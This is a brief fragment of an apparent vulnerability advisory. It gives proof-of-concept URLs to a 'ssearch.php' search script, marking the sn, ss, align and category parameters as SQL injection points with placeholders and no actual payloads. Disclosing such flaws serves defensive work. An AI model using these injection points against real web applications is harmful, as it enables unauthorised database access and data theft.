For demonstration or reproduce ...

PoC:
ssearch.php?sno=2&siche=search&page=1&sn=`[SQL Injection]&ss=`1[SQL Injection]&sm=`1&search=asd

ssearch.php?sno=1&siche=search&page=5&sn=1&ss=1&sm=1&sc=&oga=&search=hey&align=`[SQL
Injection]

ssearch.php?sno=1&siche=search&page=5&sn=1&ss=1&sm=1&sc=&oga=&search=hey&
align=mt.subject&align1=ASC&category=`[SQL Injection]
